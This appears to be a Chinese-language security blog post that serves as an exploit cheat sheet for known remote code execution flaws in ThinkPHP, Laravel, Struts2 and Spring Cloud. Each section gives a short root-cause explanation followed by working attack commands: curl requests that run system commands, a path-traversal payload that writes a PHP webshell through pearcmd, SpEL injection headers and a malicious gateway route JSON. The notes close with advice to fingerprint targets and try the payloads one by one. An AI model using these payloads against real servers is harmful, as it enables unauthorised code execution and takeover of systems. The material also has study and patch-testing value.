---
title: "框架安全：ThinkPHP、Laravel、Struts2、SpringBoot"
pubDate: 2026-08-04
tags:
  - 安全
  - 框架
---

框架漏洞的共同点——要么是"用户输入被当代码执行"（OGNL/SpEL/模板注入），要么是路由或属性绑定没把好关（命名空间穿越、class 链访问）

## Laravel CVE-2021-3129

`APP_DEBUG=true` 时 Ignition 调试组件的"解决方案"接口没过滤用户输入，Phar 反序列化打 RCE

```
python exp.py http://目标:端口
```

工具 https://github.com/zhzyker/CVE-2021-3129，基于 phpggc，多 gadget 链匹配版本

## ThinkPHP CVE-2018-1002015（命名空间穿越）

解析控制器名时直接拼用户输入，只做简单正则，允许反斜杠 `\` 穿越命名空间，调任意 public 方法`url_route_must` 默认 false

```
/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
```

Vulhub 5.0.23 环境用 POST 利用链也能 RCE

```
curl -X POST "http://目标/index.php?s=captcha" -d "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id"
```

## ThinkPHP QVD-2022-46174（多语言路径穿越）

`lang=../../../path` 可穿越包含任意 PHP 文件，配合 `pearcmd.php` 写任意文件。TP 5.0/5.1 全分支、6.0.1~6.0.13，开启多语言（`lang_switch_on=true`）

```
curl "http://目标/?+config-create+/&lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&/<?=phpinfo()?>+shell.php"
```

访问 `/shell.php` 看到 phpinfo 即成功

## Struts2 CVE-2020-17530 / S2-061（OGNL RCE）

OGNL 是 Struts2 表达式语言，用户输入能进 OGNL 解析就能执行任意代码。标签属性二次 OGNL 解析，版本 2.0.0~2.5.25。指纹 URL 带 `.action`、Java 老站

```
curl -X POST "http://目标/index.action" -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF" --data-binary @s2061.txt
```

`s2061.txt`必须 CRLF 行尾，OGNL 调 freemarker Execute 执行 id，返回页面里出现 `uid=0(root)`

## Struts2 CVE-2021-31805 / S2-062（RCE）

S2-061 补丁的二次绕过，`%{...}` 强制 OGNL 评估 + 用户输入 POC https://github.com/pyroxenites/s2-062，回显脚本默认参数 `id`，目标参数是 `name`，得改 `--par name`，回显不行用 dnslog 带外那个脚本

## SpringBoot CVE-2022-22963（SpEL RCE）

Spring Cloud Function 的 `RoutingFunction` 收到 `functionRouter` 请求时，把 `spring.cloud.function.routing-expression` 头直接交 SpEL 解析

```
curl -X POST "http://目标/functionRouter" -H "Content-Type: text/plain" -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec('touch /tmp/success')" --data-binary "test"
```

返回 500 正常，进容器看 `/tmp/success` 在不在即验证。坑：Windows PowerShell 下 SpEL 字符串必须用单引号，双引号会被命令行吃掉导致 header 截断

## SpringBoot CVE-2022-22947（SpEL RCE，三步）

Spring Cloud Gateway 暴露 Actuator 端点时，POST 创建恶意路由，filter 字段被 SpEL 解析，条件：启 Actuator + 暴露 gateway 端点 + 无认证

JSON body 写文件（避免命令行双引号被吃）`hacktest.json`：

```json
{
  "id": "hacktest",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{'id'}).getInputStream()))}"
    }
  }],
  "uri": "http://example.com"
}
```

三步：

```
curl -X POST "http://目标/actuator/gateway/routes/hacktest" -H "Content-Type: application/json" --data-binary @hacktest.json
curl -X POST "http://目标/actuator/gateway/refresh" -H "Content-Type: application/x-www-form-urlencoded" --data-binary ""
curl "http://目标/actuator/gateway/routes/hacktest"
```

第三步返回 JSON 里 `Result = 'uid=0(root)...'` 即成功

框架漏洞两条主线：用户输入被表达式引擎执行（OGNL/SpEL/Blade 模板），或绑定/路由没过滤让输入穿透到内部对象（TP 控制器名、Spring class 链）。看到框架指纹先上工具扫版本和已知 CVE，工具不行再抓包逐个试 payload
